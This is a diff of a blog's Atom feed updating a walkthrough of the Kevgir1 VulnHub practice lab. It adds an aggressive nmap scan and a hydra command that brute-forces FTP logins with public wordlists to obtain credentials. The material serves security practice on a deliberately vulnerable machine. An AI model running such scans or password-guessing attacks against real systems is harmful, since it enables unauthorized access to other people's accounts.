@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-05-02T15:18:37-05:00</updated>
+  <updated>2016-05-02T18:00:38-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -44,9 +44,17 @@
 
 <p><code>nmap -sV -v -O -A -T5 192.168.79.174 -p-</code></p>
 
+<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
 <p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
 
-<p>looks like port 8080 and 8081 are very interesting&hellip;..</p>
+<p>Let attack ftp now.</p>
+
+<p><code>hydra -L ~/tools/SecLists/Usernames/top_shortlist.txt -P ~/tools/SecLists/Passwords/john.txt  -u  -s 25 192.168.79.174 ftp</code></p>
+
+<p>get the user name and password</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/kevgir1/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
